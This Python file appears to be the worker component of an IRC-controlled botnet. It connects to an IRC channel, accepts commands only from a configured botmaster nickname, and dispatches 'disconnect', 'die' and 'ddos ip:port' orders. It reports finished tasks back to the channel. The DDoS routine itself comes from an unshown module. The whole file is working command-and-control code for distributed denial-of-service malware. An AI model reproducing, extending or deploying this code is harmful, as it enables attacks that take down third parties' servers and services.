from irc.bot import SingleServerIRCBot
from commands import SimpleDDOS, Command, Die, Disconnect, UnknownCommand
import config


class CommandResolver:
    def __init__(self, worker, command, number_of_executions):
        self.worker = worker
        self.command = command
        self.number_of_executions = number_of_executions

    def choose_action(self) -> Command:
        action: Command
        if self.command == "disconnect":
            action = Disconnect(self.worker)
        elif self.command == "die":
            action = Die(self.worker)
        elif self.command.startswith('ddos'):
            address = self.command.split()[1:]
            ip, port = address[0].split(':')
            action = SimpleDDOS(ip, port, self.number_of_executions)
        else:
            action = UnknownCommand(self.command)

        return action

    def run(self):
        action = self.choose_action()
        action.run()
        return action.status


class BotWorker(SingleServerIRCBot):
    BOTMASTER_USERNAME = config.BOTMASTER_USERNAME

    def __init__(self, nickname, channel, server, port=6667):
        SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel = channel

    def authorize(self, nickname):
        if nickname == self.BOTMASTER_USERNAME:
            return True
        else:
            return False

    def on_welcome(self, connection, event):
        connection.join(self.channel)

    def is_command(self, event):
        if event.arguments[0].startswith('!'):
            return True
        else:
            return False

    def get_task_data(self, event):
        task_uid = event.arguments[0].split()[1][:-1]
        command = ' '.join(event.arguments[0][1:].split()[2:-2])[1:]
        number_of_executions = event.arguments[0][1:].split()[-1]
        return task_uid, command, number_of_executions

    def on_privmsg(self, connection, event):
        if self.is_command(event):
            task_uid, command, number_of_executions = self.get_task_data(event)
            result = self.run_command(event, command, number_of_executions)
            if result:
                self.task_done_notification(task_uid)

    def task_done_notification(self, task_uid):
        self.send_message("Task {} is done".format(task_uid), self.channel)

    def send_message(self, message, user):
        self.connection.privmsg(user, message)

    def on_pubmsg(self, connection, event):
        pass

    def run_command(self, event, cmd, number_of_executions):
        if not self.authorize(event.source.nick):
            return
        command_resolver = CommandResolver(self, cmd, number_of_executions)
        result = command_resolver.run()
        return result


def main():
    nickname = config.WORKER_NICKNAME
    bot = BotWorker(nickname, config.CHANNEL_NAME, config.SERVER, config.PORT)
    bot.start()


if __name__ == "__main__":
    main()
